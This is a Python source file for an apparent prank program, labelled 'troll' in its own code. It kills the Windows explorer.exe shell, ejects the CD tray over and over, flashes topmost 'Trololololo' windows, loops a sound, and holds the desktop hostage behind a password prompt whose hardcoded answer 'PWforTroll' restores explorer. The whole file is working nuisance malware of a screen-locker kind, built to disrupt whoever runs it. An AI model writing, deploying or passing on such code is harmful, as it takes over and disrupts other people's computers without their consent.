import time, os, platform, ctypes, tkinter as tk, random
from threading import Thread

if platform.system() == "Windows":
        import winsound

os.system("taskkill /f /im explorer.exe")

def ejectCDROM():
        if platform.system() == 'Windows':
        # need 'u' before "", if you are using UTF-8. if not you don't need to put it.
            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
            #ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)

        # OSX
        elif platform.system() == 'Darwin':
            os.system("drutil tray open")
            #os.system("drutil tray closed")

        # Linux
        elif platform.system() == 'Linux':
            os.system("eject cdrom")
            #os.system("eject -t cdrom")

        # NetBSD
        elif platform.system() == 'NetBSD':
            #you must be su
            os.system("eject cd")
        else:
            print ("OS Unsupported\n")

class ersteKlasse(Thread):
        def __init__(self):
            Thread.__init__(self)

        def run(self):
                time.sleep(5)
                while True:
                        ejectCDROM()
                        time.sleep(random.randint(2, 5))



class zweiteKlasse(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        zaehler = 0
        nenner = 20
        passwort = "PWforTroll"
        antwort = ""
        antwort1 = ""
        time.sleep(3)
        while(True):
            def center_window(width="200", height="160"):

                x = random.randint(10, 1000)
                y = random.randint(100,500)
                
                root.geometry('%dx%d+%d+%d' % (550, 150, x, y))

            if zaehler == nenner:
                zaehler = 0
                nenner += nenner
                def senden(eingabewidget, labelwidget):
                    pwdinput = str(eingabewidget.get())
                    if pwdinput != passwort:  
                            time.sleep(1)
                            ejectCDROM()
                            root.destroy()

                    if pwdinput == passwort:
                            time.sleep(1)
                            os.system("%systemroot%\sysnative\cmd.exe /c start /B explorer.exe")
                            os.system("taskkill /f /im pythonw.exe")



                #GUI
                root = tk.Tk()
                root.attributes("-topmost", True)
                root.title("Passwort")
                root.configure(bg="yellow")
                root.geometry("400x175")

                #Überschrift
                labelStart = tk.Label(root, text="Passwort", bg="yellow", fg="red", width=200, font=("Comic Sans MS",60))
                labelStart.pack()

                #Antwort
                labelAntwort = tk.Label(root, text=antwort, width=200, bg="white", fg="black")

                #Eingabe
                eingabe = tk.Entry(root, show="*", width=25, text=antwort1)
                eingabe.pack()

                button = tk.Button(root,
                                        text = "eingabe",
                                        command = lambda: senden(eingabe, labelAntwort))
                button.pack()
                root.mainloop()
                
            zaehler += 1
            
            root = tk.Tk()
            root.attributes("-topmost", True)
            root.title("Trololololo")
            root.configure(bg="red")
            tk.Label(root,
                        fg="yellow",
                        bg="red",
                        text="Trololololo",
                        font=("Comic Sans MS", 80)).pack()
            root.after(500, lambda: root.destroy())
            center_window(200, 160)
            root.mainloop()

if platform.system() == "Windows":
        class dritteKlasse(Thread):
                def __init__(self):
                        Thread.__init__(self)

                def run(self):
                        while True:
                                winsound.PlaySound("troll.wav", winsound.SND_ASYNC | winsound.SND_ALIAS )
                                time.sleep(162)
                
if __name__=='__main__':
        a=ersteKlasse()
        b=zweiteKlasse()
        if platform.system() == "Windows":
                c=dritteKlasse()

        a.start()
        b.start()
        if platform.system() == "Windows":
                c.start()
